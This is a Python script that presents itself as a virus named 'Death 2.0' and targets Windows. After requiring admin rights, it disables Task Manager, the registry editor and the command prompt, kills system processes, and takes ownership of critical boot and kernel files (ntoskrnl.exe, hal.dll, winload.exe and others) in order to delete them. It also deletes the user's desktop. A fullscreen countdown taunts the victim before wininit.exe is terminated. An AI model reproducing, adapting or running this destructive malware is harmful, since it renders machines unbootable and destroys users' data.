from tkinter import *
import tkinter as tk
import subprocess
import sys
import os
import ctypes
import threading
import time



def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


try:
    is_admin = os.getuid() == 0
except AttributeError:
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

if is_admin == False:
    MessageBox = ctypes.windll.user32.MessageBoxW
    MessageBox(None, 'To enjoy this virus pls check admin-rights..', 'SAD', 0)
    sys.exit()


def intr(cmd):
    try:
        from subprocess import DEVNULL
    except ImportError:
        DEVNULL = os.open(os.devnull, os.O_RDWR)

    output = subprocess.check_output(cmd, stdin=DEVNULL, stderr=DEVNULL, shell=True)
    return output


def kill_windows():
    intr('taskkill /f /im svchost.exe')
    intr('taskkill /f /im explorer.exe')
    intr('REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System  /v  DisableTaskMgr  /t REG_DWORD  /d 1 /f')
    intr('REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v  DisableRegistryTools /t REG_DWORD /d 1 /f')
    intr('REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v  DisableCMD /t REG_DWORD /d 1 /f')

    intr('takeown /f C:\Windows\System32\drivers\disk.sys && icacls C:\Windows\System32\drivers\disk.sys /grant %username%:F')
    intr('Takeown /f "C:\windows\system32\hal.dll"')
    intr('Takeown /f "C:\windows\system32\ci.dll"')
    intr('Takeown /f "C:\windows\system32\ntdll.dll"')
    intr('Takeown /f "C:\windows\system32\winload.exe"')
    intr('Takeown /f "C:\windows\system32\ntoskrnl.exe"')
    intr('Takeown /f "C:\windows\system32\winresume.exe"')

    intr('icacls "C:\windows\system32\ci.dll" /grant everyone:(F) /t /c')
    intr('icacls "C:\windows\system32\hal.dll" /grant everyone:(F) /t /c')
    intr('icacls "C:\windows\system32\ntdll.dll" /grant everyone:(F) /t /c')
    intr('icacls "C:\windows\system32\ntoskrnl.exe" /grant everyone:(F) /t /c')
    intr('icacls "C:\windows\system32\winload.exe" /grant everyone:(F) /t /c')
    intr('icacls "C:\windows\system32\winresume.exe" /grant everyone:(F) /t /c')

    intr('Del /f /a /q "C:\windows\system32\hal.dll"')
    intr('Del /f /a /q "C:\windows\system32\ci.dll"')
    intr('Del /f /a /q "C:\windows\system32\ntdll.dll"')
    intr('Del /f /a /q "C:\windows\system32\winload.exe"')
    intr('Del /f /a /q "C:\windows\system32\winresume.exe"')
    intr('Del /f /a /q "C:\windows\system32\ntoskrnl.exe"')
    intr('Del /f /a /q "%USERPROFILE%\desktop"')


def disable_event():
    pass


def pull_gui():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    title = Label(root, text='WELCOME TO Death 2.0 (HOPE YOUR PC IS DOING WELL)', font=('Terminal', 25), height=720, width=720, fg='red').pack()
    image = tk.PhotoImage(file=resource_path('images.jfif'))
    label = Label(root, image=image)
    label.place(anchor="center", x=650, y=200)

    i = Label(root, text='', fg='black', font=('Terminal', 13))
    i.place(x=550, y=400)
    t = 30

    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        time.sleep(1)
        t -= 1
        i['text'] = 'PC DEATH IN: ' + str(timer)
        root.update()

    intr('taskkill /IM wininit.exe /F')

    root.overrideredirect(True)
    root.protocol("WM_DELETE_WINDOW", disable_event)
    root.mainloop()

if __name__ == "__main__":
    t1 = threading.Thread(target=kill_windows)
    t2 = threading.Thread(target=pull_gui)

    t1.start()
    t2.start()

    t1.join()
    t2.join()
